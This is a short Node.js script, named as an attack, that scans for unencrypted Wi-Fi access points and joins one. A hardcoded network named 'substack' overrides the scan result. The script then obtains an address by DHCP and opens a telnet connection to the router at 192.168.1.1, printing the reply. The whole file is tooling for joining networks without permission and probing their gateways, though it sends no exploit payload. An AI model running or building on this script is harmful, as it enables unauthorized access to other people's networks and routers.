var iw = require('./lib/iw')(process.argv[2] || 'ath0');
var net = require('net');
var spawn = require('child_process').spawn;
var exec = require('child_process').exec;

function attack () {
    iw.scan(function (err, nodes) {
        var open = nodes.filter(function (node) {
            return node.encrypted === false;
        });
        open = [ { 'essid' : 'substack', 'address' : '90:03:B7:2C:13:F9' } ];
        var ap = open[Math.floor(Math.random() * open.length)];
        if (!ap) return setTimeout(attack, 5000);
        
        iw.connect(ap.essid, function (err) {
            if (err) setTimeout(attack, 5000);
            else dhcp(function (err) {
                if (err) setTimeout(attack, 5000)
                else telnet('192.168.1.1')
            })
        });
    });
}

function dhcp (cb) {
    var failed = false;
    
    var to1;
    var to0 = setTimeout(function () {
        failed = true;
        if (to1) clearTimeout(to1);
        cb('timed out');
    }, 15 * 1000);
    
    (function retry () {
        if (failed) return;
        
        var ps = spawn('dhclient', [ iw.iface ]);
        ps.on('exit', function () {
            getAddr(function (addr) {
                if (/^192\.168\./.test(addr)) {
                    clearTimeout(to0);
                    clearTimeout(to1);
                    cb(null);
                }
                else to1 = setTimeout(retry, 5000);
            });
        });
    })();
}

function getAddr (cb) {
    exec('ifconfig ' + iw.iface, function (err, stdout) {
        var m = /inet addr:(\S+)/.exec(stdout);
        cb(m && m[1]);
    });
}

function telnet (addr) {
    var s = net.connect(23, addr);
    s.pipe(process.stdout, { end : false });
}

attack();
